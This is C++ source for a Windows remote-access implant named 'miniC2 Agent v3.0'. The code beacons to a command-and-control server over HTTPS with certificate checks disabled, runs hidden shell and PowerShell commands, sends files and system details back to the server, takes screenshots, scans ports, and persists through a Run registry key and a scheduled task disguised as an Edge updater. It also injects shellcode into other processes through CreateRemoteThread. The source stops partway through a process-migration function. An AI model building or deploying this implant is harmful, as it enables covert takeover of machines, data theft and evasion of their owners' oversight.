/*
 * miniC2 Agent v3.0 - Windows Implant (HTTPS)
 * Build: g++ -o agent.exe agent.cpp -lwinhttp -ladvapi32 -luser32 -lgdi32 -lole32 -loleaut32 -luuid -lrpcrt4 -lws2_32 -static -O2 -w
 */
#define _WIN32_WINNT 0x0601
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <rpc.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#define INITGUID
#include <comdef.h>
#include <Wbemidl.h>

#define C2_HOST        L"127.0.0.1"
#define C2_PORT        8443
#define SLEEP_SECONDS  10
#define SLEEP_JITTER   30
#define MAX_BUF        65536
#define MAX_FILE_BUF   33554432

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID    PebBaseAddress;
    ULONG_PTR AffinityMask;
    LONG     BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

static char g_agent_id[64] = {0};
static int g_sleep = SLEEP_SECONDS;
static BOOL g_has_id = FALSE;

static HHOOK g_keyhook = NULL;
static HANDLE g_keylog_thread = NULL;
static DWORD g_keylog_thread_id = 0;
static CRITICAL_SECTION g_keylog_cs;
static char g_keylog_buf[MAX_BUF] = {0};
static int g_keylog_pos = 0;
static volatile BOOL g_keylog_active = FALSE;
static volatile BOOL g_keylog_stop_flag = FALSE;

static void generate_short_id(char* buf, int len) {
    UUID uuid;
    UuidCreate(&uuid);
    char hex[40];
    sprintf_s(hex, "%08x%04x%04x%02x%02x%02x%02x%02x%02x%02x%02x",
        uuid.Data1, uuid.Data2, uuid.Data3,
        uuid.Data4[0], uuid.Data4[1], uuid.Data4[2], uuid.Data4[3],
        uuid.Data4[4], uuid.Data4[5], uuid.Data4[6], uuid.Data4[7]);
    int copy_len = (len - 1 < 16) ? len - 1 : 16;
    strncpy_s(buf, len, hex, copy_len);
    buf[copy_len] = 0;
}

static void json_escape(const char* src, char* dst, int dst_len) {
    int j = 0;
    for (int i = 0; src[i] && j < dst_len - 2; i++) {
        switch (src[i]) {
            case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            default: dst[j++] = src[i]; break;
        }
    }
    dst[j] = 0;
}

static const char* json_find_value(const char* json, const char* key, char* val, int val_len) {
    val[0] = 0;
    char search[128];
    sprintf_s(search, "\"%s\"", key);
    const char* pos = strstr(json, search);
    if (!pos) return val;
    pos += strlen(search);
    while (*pos == ' ' || *pos == ':') pos++;
    if (*pos == '"') {
        pos++;
        int i = 0;
        while (*pos && *pos != '"' && i < val_len - 1) {
            if (*pos == '\\' && pos[1]) pos++;
            val[i++] = *pos++;
        }
        val[i] = 0;
    } else {
        int i = 0;
        while (*pos && *pos != ',' && *pos != '}' && *pos != ' ' && i < val_len - 1) {
            val[i++] = *pos++;
        }
        val[i] = 0;
    }
    return val;
}

static BOOL https_post(const wchar_t* path, const char* body, char* response, int resp_len) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;
    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    const wchar_t* headers = L"Content-Type: application/json";
    DWORD body_len = (DWORD)strlen(body);
    BOOL sent = WinHttpSendRequest(hRequest, headers, (DWORD)-1, (LPVOID)body, body_len, body_len, 0);
    if (sent) sent = WinHttpReceiveResponse(hRequest, NULL);
    if (sent) {
        DWORD bytes_read = 0;
        response[0] = 0;
        int total = 0;
        while (WinHttpReadData(hRequest, response + total, resp_len - total - 1, &bytes_read) && bytes_read > 0)
            total += bytes_read;
        response[total] = 0;
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return sent;
}

static BOOL https_upload(const wchar_t* path, const char* filename, const char* data,
                         DWORD data_len, char* response, int resp_len) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return FALSE;
    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return FALSE; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return FALSE; }
    DWORD secFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &secFlags, sizeof(secFlags));
    wchar_t headers[512];
    wchar_t wfname[256];
    MultiByteToWideChar(CP_UTF8, 0, filename, -1, wfname, 256);
    swprintf_s(headers, 512, L"Content-Type: application/octet-stream\r\nX-Filename: %s", wfname);
    BOOL sent = WinHttpSendRequest(hRequest, headers, (DWORD)-1, (LPVOID)data, data_len, data_len, 0);
    if (sent) sent = WinHttpReceiveResponse(hRequest, NULL);
    if (sent) {
        DWORD bytes_read = 0;
        response[0] = 0;
        int total = 0;
        while (WinHttpReadData(hRequest, response + total, resp_len - total - 1, &bytes_read) && bytes_read > 0)
            total += bytes_read;
        response[total] = 0;
    }
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return sent;
}

static void build_checkin(char* buf, int len) {
    char hostname[256] = {0};
    DWORD hn_len = 256;
    GetComputerNameA(hostname, &hn_len);
    char username[256] = {0};
    DWORD un_len = 256;
    GetUserNameA(username, &un_len);
    typedef LONG(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    char os_str[128] = "Windows";
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW rovi = {0};
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            fn(&rovi);
            sprintf_s(os_str, "Windows %d.%d Build %d", rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
        }
    }
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" :
                       (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) ? "x86" : "other";
    char process_name[256] = {0};
    GetModuleFileNameA(NULL, process_name, 256);
    char eh[512], eu[512], eo[256], ep[512];
    json_escape(hostname, eh, 512);
    json_escape(username, eu, 512);
    json_escape(os_str, eo, 256);
    json_escape(process_name, ep, 512);
    snprintf(buf, len,
        "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"arch\":\"%s\",\"pid\":%lu,\"process\":\"%s\",\"sleep\":%d}",
        g_agent_id, eh, eu, eo, arch, (unsigned long)GetCurrentProcessId(), ep, g_sleep);
}

static void gather_sysinfo(char* output, int out_len) {
    char hostname[256] = {0};
    DWORD hn_len = 256;
    GetComputerNameA(hostname, &hn_len);
    char username[256] = {0};
    DWORD un_len = 256;
    GetUserNameA(username, &un_len);
    typedef LONG(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    char os_str[128] = "Windows";
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        RtlGetVersionPtr fn = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
        if (fn) {
            RTL_OSVERSIONINFOW rovi = {0};
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            fn(&rovi);
            sprintf_s(os_str, "Windows %d.%d Build %d", rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
        }
    }
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    const char* arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" :
                       (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) ? "x86" : "other";
    char process_name[256] = {0};
    GetModuleFileNameA(NULL, process_name, 256);
    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    DWORD num_cpu = si.dwNumberOfProcessors;
    ULONGLONG total_disk = 0, free_disk = 0;
    char sys_drive[] = "C:\\";
    ULARGE_INTEGER free_bytes, total_bytes;
    if (GetDiskFreeSpaceExA(sys_drive, &free_bytes, &total_bytes, NULL)) {
        total_disk = total_bytes.QuadPart;
        free_disk = free_bytes.QuadPart;
    }
    char eh[512], eu[512], eo[256], ep[512];
    json_escape(hostname, eh, 512);
    json_escape(username, eu, 512);
    json_escape(os_str, eo, 256);
    json_escape(process_name, ep, 512);
    snprintf(output, out_len,
        "{\"agent_id\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"arch\":\"%s\","
        "\"pid\":%lu,\"process\":\"%s\",\"cpus\":%lu,\"ram_total\":%llu,\"ram_free\":%llu,"
        "\"disk_total\":%llu,\"disk_free\":%llu}",
        g_agent_id, eh, eu, eo, arch, (unsigned long)GetCurrentProcessId(), ep,
        num_cpu, mem.ullTotalPhys, mem.ullAvailPhys, total_disk, free_disk);
}

static void exec_shell(const char* cmd, char* output, int out_len) {
    char cmd_line[4096];
    sprintf_s(cmd_line, "cmd.exe /c %s", cmd);
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        strcpy_s(output, out_len, "{\"error\":\"CreatePipe failed\"}");
        return;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        strcpy_s(output, out_len, "{\"error\":\"CreateProcess failed\"}");
        CloseHandle(hRead); CloseHandle(hWrite);
        return;
    }
    CloseHandle(hWrite);
    int total = 0;
    DWORD bytes_read = 0;
    while (total < out_len - 1 && ReadFile(hRead, output + total, out_len - total - 1, &bytes_read, NULL) && bytes_read > 0)
        total += bytes_read;
    output[total] = 0;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
}

static void exec_powershell(const char* cmd, char* output, int out_len) {
    char cmd_line[4096];
    sprintf_s(cmd_line, "powershell.exe -NoProfile -NonInteractive -Command \"%s\"", cmd);
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        strcpy_s(output, out_len, "{\"error\":\"CreatePipe failed\"}");
        return;
    }
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    if (!CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        strcpy_s(output, out_len, "{\"error\":\"CreateProcess failed\"}");
        CloseHandle(hRead); CloseHandle(hWrite);
        return;
    }
    CloseHandle(hWrite);
    int total = 0;
    DWORD bytes_read = 0;
    while (total < out_len - 1 && ReadFile(hRead, output + total, out_len - total - 1, &bytes_read, NULL) && bytes_read > 0)
        total += bytes_read;
    output[total] = 0;
    WaitForSingleObject(pi.hProcess, 30000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hRead);
}

static void whoami_cmd(char* output, int out_len) {
    char username[256] = {0};
    DWORD un_len = 256;
    GetUserNameA(username, &un_len);
    char hostname[256] = {0};
    DWORD hn_len = 256;
    GetComputerNameA(hostname, &hn_len);
    BOOL elevated = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elev;
        DWORD ret_len;
        if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &ret_len))
            elevated = elev.TokenIsElevated;
        CloseHandle(hToken);
    }
    snprintf(output, out_len, "{\"username\":\"%s\",\"hostname\":\"%s\",\"domain\":\"%s\",\"elevated\":%s}",
        username, hostname, hostname, elevated ? "true" : "false");
}

static void take_screenshot(const char* out_path) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    HDC hScreen = GetDC(NULL);
    HDC hMem = CreateCompatibleDC(hScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hMem, hBitmap);
    BitBlt(hMem, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);
    BITMAPFILEHEADER bfh = {0};
    BITMAPINFOHEADER bih = {0};
    bih.biSize = sizeof(BITMAPINFOHEADER);
    bih.biWidth = w;
    bih.biHeight = h;
    bih.biPlanes = 1;
    bih.biBitCount = 24;
    bih.biCompression = BI_RGB;
    bih.biSizeImage = w * h * 3;
    bfh.bfType = 0x4D42;
    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize = bfh.bfOffBits + bih.biSizeImage;
    char* pixels = (char*)malloc(bih.biSizeImage);
    GetDIBits(hMem, hBitmap, 0, h, pixels, (BITMAPINFO*)&bih, DIB_RGB_COLORS);
    FILE* f = fopen(out_path, "wb");
    if (f) {
        fwrite(&bfh, sizeof(bfh), 1, f);
        fwrite(&bih, sizeof(bih), 1, f);
        fwrite(pixels, 1, bih.biSizeImage, f);
        fclose(f);
    }
    free(pixels);
    DeleteObject(hBitmap);
    DeleteDC(hMem);
    ReleaseDC(NULL, hScreen);
}

static void list_processes(char* output, int out_len) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        strcpy_s(output, out_len, "{\"error\":\"CreateToolhelp32Snapshot failed\"}");
        return;
    }
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    char* p = output;
    int remaining = out_len;
    int written = snprintf(p, remaining, "{\"processes\":[");
    p += written; remaining -= written;
    BOOL first = TRUE;
    if (Process32First(hSnap, &pe)) {
        do {
            char escaped_name[256];
            json_escape(pe.szExeFile, escaped_name, 256);
            written = snprintf(p, remaining, "%s{\"pid\":%lu,\"ppid\":%lu,\"threads\":%lu,\"name\":\"%s\"}",
                first ? "" : ",", (unsigned long)pe.th32ProcessID, (unsigned long)pe.th32ParentProcessID,
                (unsigned long)pe.cntThreads, escaped_name);
            p += written; remaining -= written;
            first = FALSE;
        } while (Process32Next(hSnap, &pe) && remaining > 100);
    }
    snprintf(p, remaining, "]}");
    CloseHandle(hSnap);
}

static void kill_process(const char* pid_str, char* output, int out_len) {
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    if (pid == 0) {
        strcpy_s(output, out_len, "{\"error\":\"invalid PID\"}");
        return;
    }
    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProc) {
        if (TerminateProcess(hProc, 0))
            snprintf(output, out_len, "{\"status\":\"ok\",\"pid\":%lu}", (unsigned long)pid);
        else
            snprintf(output, out_len, "{\"error\":\"TerminateProcess failed\"}");
        CloseHandle(hProc);
    } else {
        snprintf(output, out_len, "{\"error\":\"OpenProcess failed (access denied?)\"}");
    }
}

static void add_persistence(char* output, int out_len) {
    HKEY hKey;
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (res == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "miniC2Updater", 0, REG_SZ, (BYTE*)exe_path, (DWORD)strlen(exe_path) + 1);
        RegCloseKey(hKey);
        snprintf(output, out_len, "{\"status\":\"ok\",\"method\":\"registry\",\"key\":\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\miniC2Updater\",\"path\":\"%s\"}", exe_path);
    } else {
        snprintf(output, out_len, "{\"error\":\"RegOpenKeyExA failed: %ld\"}", res);
    }
}

static void add_persistence_schtasks(char* output, int out_len) {
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "schtasks /create /tn \"MicrosoftEdgeUpdateCore\" /tr \"%s\" /sc onlogon /rl highest /f",
        exe_path);
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 10000);
        DWORD exit_code = 0;
        GetExitCodeProcess(pi.hProcess, &exit_code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        if (exit_code == 0) {
            snprintf(output, out_len, "{\"status\":\"ok\",\"method\":\"schtasks\",\"task\":\"MicrosoftEdgeUpdateCore\",\"path\":\"%s\"}", exe_path);
        } else {
            snprintf(output, out_len, "{\"error\":\"schtasks failed with code %lu\"}", exit_code);
        }
    } else {
        snprintf(output, out_len, "{\"error\":\"CreateProcess schtasks failed, code %lu\"}", GetLastError());
    }
}

static void remove_persistence(char* output, int out_len) {
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (res == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "miniC2Updater");
        RegCloseKey(hKey);
    }
    char cmd[] = "schtasks /delete /tn \"MicrosoftEdgeUpdateCore\" /f";
    STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { WaitForSingleObject(pi.hProcess, 5000); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
    strcpy_s(output, out_len, "{\"status\":\"ok\",\"message\":\"persistence removed (registry + schtasks)\"}");
}

static void portscan(const char* target, const char* ports_arg, int timeout_ms, char* output, int out_len) {
    struct addrinfo hints = {0}, *result;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(target, NULL, &hints, &result) != 0) {
        snprintf(output, out_len, "{\"error\":\"DNS resolution failed for %s\"}", target);
        return;
    }
    int ports[1024];
    int port_count = 0;
    char ports_copy[2048];
    strncpy_s(ports_copy, ports_arg, 2047);
    ports_copy[2047] = 0;
    char* ctx = NULL;
    char* token = strtok_s(ports_copy, ",", &ctx);
    while (token && port_count < 1024) {
        char* dash = strchr(token, '-');
        if (dash) {
            *dash = 0;
            int start = atoi(token);
            int end = atoi(dash + 1);
            for (int p = start; p <= end && port_count < 1024; p++)
                ports[port_count++] = p;
        } else {
            ports[port_count++] = atoi(token);
        }
        token = strtok_s(NULL, ",", &ctx);
    }
    char open_list[4096] = {0};
    int open_count = 0;
    for (int i = 0; i < port_count; i++) {
        SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s == INVALID_SOCKET) continue;
        u_long mode = 1;
        ioctlsocket(s, FIONBIO, &mode);
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons((u_short)ports[i]);
        addr.sin_addr = ((struct sockaddr_in*)result->ai_addr)->sin_addr;
        connect(s, (struct sockaddr*)&addr, sizeof(addr));
        fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(s, &writefds);
        struct timeval tv;
        tv.tv_sec = timeout_ms / 1000;
        tv.tv_usec = (timeout_ms % 1000) * 1000;
        int sel = select(0, NULL, &writefds, NULL, &tv);
        if (sel > 0) {
            int err = 0;
            int errlen = sizeof(err);
            getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &errlen);
            if (err == 0) {
                if (open_count > 0) strcat_s(open_list, ",");
                char pstr[16];
                sprintf_s(pstr, "%d", ports[i]);
                strcat_s(open_list, pstr);
                open_count++;
            }
        }
        closesocket(s);
    }
    freeaddrinfo(result);
    snprintf(output, out_len, "{\"target\":\"%s\",\"open\":[%s],\"total_scanned\":%d}",
        target, open_list, port_count);
}

static void download_file(const char* path, char* output, int out_len) {
    FILE* f = fopen(path, "rb");
    if (!f) { snprintf(output, out_len, "{\"error\":\"file not found: %s\"}", path); return; }
    fseek(f, 0, SEEK_END);
    long size = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (size > MAX_FILE_BUF) {
        snprintf(output, out_len, "{\"error\":\"file too large: %ld bytes\"}", size);
        fclose(f);
        return;
    }
    char* data = (char*)malloc(size);
    fread(data, 1, size, f);
    fclose(f);
    static const char* b64table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int elen = ((size + 2) / 3) * 4 + 1;
    char* enc = (char*)malloc(elen);
    int j = 0;
    for (long i = 0; i < size; i += 3) {
        unsigned int a = (unsigned char)data[i];
        unsigned int b = (i + 1 < size) ? (unsigned char)data[i + 1] : 0;
        unsigned int c = (i + 2 < size) ? (unsigned char)data[i + 2] : 0;
        unsigned int t = (a << 16) | (b << 8) | c;
        enc[j++] = b64table[(t >> 18) & 0x3F];
        enc[j++] = b64table[(t >> 12) & 0x3F];
        enc[j++] = (i + 1 < size) ? b64table[(t >> 6) & 0x3F] : '=';
        enc[j++] = (i + 2 < size) ? b64table[t & 0x3F] : '=';
    }
    enc[j] = 0;
    char ep[512];
    json_escape(path, ep, 512);
    snprintf(output, out_len, "{\"filename\":\"%s\",\"size\":%ld,\"data_b64\":\"%s\"}", ep, size, enc);
    free(data);
    free(enc);
}

static int b64_decode_char(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0;
}

static void upload_file(const char* remote_path, const char* b64_data, char* output, int out_len) {
    int b64_len = (int)strlen(b64_data);
    int decoded_len = (b64_len / 4) * 3;
    if (b64_len > 0 && b64_data[b64_len - 1] == '=') decoded_len--;
    if (b64_len > 1 && b64_data[b64_len - 2] == '=') decoded_len--;
    if (decoded_len <= 0) { strcpy_s(output, out_len, "{\"error\":\"invalid base64\"}"); return; }
    unsigned char* decoded = (unsigned char*)malloc((size_t)decoded_len);
    int j = 0;
    for (int i = 0; i < b64_len; i += 4) {
        unsigned int a = b64_decode_char(b64_data[i]);
        unsigned int b = (i+1<b64_len) ? b64_decode_char(b64_data[i+1]) : 0;
        unsigned int c = (i+2<b64_len) ? b64_decode_char(b64_data[i+2]) : 0;
        unsigned int d = (i+3<b64_len) ? b64_decode_char(b64_data[i+3]) : 0;
        unsigned int t = (a<<18)|(b<<12)|(c<<6)|d;
        if (j < decoded_len) decoded[j++] = (t>>16)&0xFF;
        if (j < decoded_len) decoded[j++] = (t>>8)&0xFF;
        if (j < decoded_len) decoded[j++] = t&0xFF;
    }
    FILE* f = fopen(remote_path, "wb");
    if (f) { fwrite(decoded, 1, decoded_len, f); fclose(f);
        snprintf(output, out_len, "{\"status\":\"ok\",\"bytes\":%d}", decoded_len);
    } else { snprintf(output, out_len, "{\"error\":\"write failed\"}"); }
    free(decoded);
}

static void inject_shellcode(const char* pid_str, const char* b64_sc, char* output, int out_len) {
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    if (pid == 0) { strcpy_s(output, out_len, "{\"error\":\"invalid PID\"}"); return; }
    int b64_len = (int)strlen(b64_sc);
    int sc_len = (b64_len / 4) * 3;
    if (b64_len > 0 && b64_sc[b64_len - 1] == '=') sc_len--;
    if (b64_len > 1 && b64_sc[b64_len - 2] == '=') sc_len--;
    if (sc_len <= 0) { strcpy_s(output, out_len, "{\"error\":\"invalid shellcode\"}"); return; }
    unsigned char* sc = (unsigned char*)malloc(sc_len);
    int j = 0;
    for (int i = 0; i < b64_len; i += 4) {
        unsigned int a = b64_decode_char(b64_sc[i]);
        unsigned int b = (i+1<b64_len) ? b64_decode_char(b64_sc[i+1]) : 0;
        unsigned int c = (i+2<b64_len) ? b64_decode_char(b64_sc[i+2]) : 0;
        unsigned int d = (i+3<b64_len) ? b64_decode_char(b64_sc[i+3]) : 0;
        unsigned int t = (a<<18)|(b<<12)|(c<<6)|d;
        if (j < sc_len) sc[j++] = (t>>16)&0xFF;
        if (j < sc_len) sc[j++] = (t>>8)&0xFF;
        if (j < sc_len) sc[j++] = t&0xFF;
    }
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) { free(sc); snprintf(output, out_len, "{\"error\":\"OpenProcess failed\"}"); return; }
    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote_mem) { free(sc); CloseHandle(hProc); snprintf(output, out_len, "{\"error\":\"VirtualAllocEx failed\"}"); return; }
    if (!WriteProcessMemory(hProc, remote_mem, sc, sc_len, NULL)) {
        free(sc); VirtualFreeEx(hProc, remote_mem, 0, MEM_RELEASE); CloseHandle(hProc);
        snprintf(output, out_len, "{\"error\":\"WriteProcessMemory failed\"}"); return;
    }
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)remote_mem, NULL, 0, NULL);
    if (hThread) {
        snprintf(output, out_len, "{\"status\":\"ok\",\"pid\":%lu,\"thread_id\":%lu,\"size\":%d}",
            (unsigned long)pid, (unsigned long)GetThreadId(hThread), sc_len);
        CloseHandle(hThread);
    } else {
        snprintf(output, out_len, "{\"error\":\"CreateRemoteThread failed\"}");
    }
    free(sc);
    CloseHandle(hProc);
}

static void migrate_process(const char* pid_str, char* output, int out_len) {
    DWORD pid = (DWORD)strtoul(pid_str, NULL, 10);
    if (pid == 0) { strcpy_s(output, out_len, "{\"error\":\"invalid PID\"}"); return; }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) { snprintf(output, out_len, "{\"error\":\"OpenProcess failed\"}"); return; }
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    int path_len = (int)strlen(exe_path) + 1;
    LPVOID remote_mem = VirtualAllocEx(hProc, NULL, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote_mem) { CloseHandle(hProc); snprintf(output, out_len, "{\"error\":\"VirtualAllocEx failed\"}"); return; }
    WriteProcessMemory(hProc, remote_mem, exe_path, path_len, NULL);
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "CreateProcessA"),
        remote_mem, 0, NULL);
    if (hThread) {
        snprintf(output, out_len, "{\"status\":\"ok\",\"target_pid\":%lu}", (unsigned long)pid);
